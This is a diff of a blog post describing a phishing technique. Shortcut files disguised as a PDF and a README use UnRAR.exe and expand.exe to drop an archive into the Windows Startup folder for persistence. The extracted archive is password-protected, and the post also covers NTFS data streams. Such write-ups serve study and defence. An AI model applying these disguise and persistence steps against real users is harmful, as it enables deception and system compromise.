@@ -124,25 +124,25 @@ You can also put a direct link for Google Drive using the references below:
 The victim will either click on it after extracting it or open it directly. Let's look at the both images.
 
 ![Download](/assets/posts/2024-07-14-phishing-is-real/unrar.png)
-_If unrar:_
+_If unrar_
 
 ![Download](/assets/posts/2024-07-14-phishing-is-real/rar.png)
-_If click directly:_
+_If click directly_
 
 ## Let's Analyze Shortcut Files
 
 You know, shortcut files usually aim to run target files.
 
-__For Google Policy Violation Warning.pdf.lnk:__
-
 ![Download](/assets/posts/2024-07-14-phishing-is-real/google-lnk.png)
-_Properties_
+_Google Policy Violation Warning.pdf.lnk Properties_
 
-Target aims to run:
+Target:
 
 ```bat
 C:\>%ProgramW6432%\WinRAR\UnRAR.exe x "%userprofile%\Downloads\Google Policy Violation Warning.rar" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
 ```
+
+There's no need to explain the code; it's clear enough.
 
 __After click, Contents of Startup:__
 
@@ -150,12 +150,10 @@ __After click, Contents of Startup:__
 
 "Send to OneNote" is default.
 
-In general, the browser's default download folder is __C:\users\your name\downloads__. There's no need to explain the code; it's clear enough.
+In general, the browser's default download folder is __C:\users\your name\downloads__.
 
 > WinRAR is usually installed on computers, and UnRAR.exe does not exist in the [LOLBAS Project](https://lolbas-project.github.io/#)
 {: .prompt-tip}
-
-__README.md.lnk:__
 
 This file is going to be run on startup.
 
@@ -166,11 +164,16 @@ C:\Windows\System32\expand.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\
 __After expand, startup folder view:__
 
 ![Startup](/assets/posts/2024-07-14-phishing-is-real/startup.png)
+_README.md.lnk:_
+
+"Send to OneNote" is __not__ default after expand.
+
+You should see two new files (a.rar and OneNote Shortcut). OneNote is the default, I know, I must force it. Yes, I know... Just focus on the technique.
 
 > expand.exe is built on Windows. I hope that you have seen NTFS data stream..
 {: .prompt-info }
 
-You can create cabinet file and data stream like below.
+## How to create cabinet file and NTFS data stream?
 
 ```console
 $@echo off
@@ -237,8 +240,6 @@ C:\> dir /r
 ![Cabinet](/assets/posts/2024-07-14-phishing-is-real/cab.png)
 
 __Send to OneNote:__
-
-You should see two new files (a.rar and OneNote Shortcut). OneNote is the default, I know, I must force it. Yes, I know... Just focus on the technique.
 
 ```bat
 %ProgramW6432%\WinRAR\UnRAR.exe x "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\a.rar" -pS1B3R@!
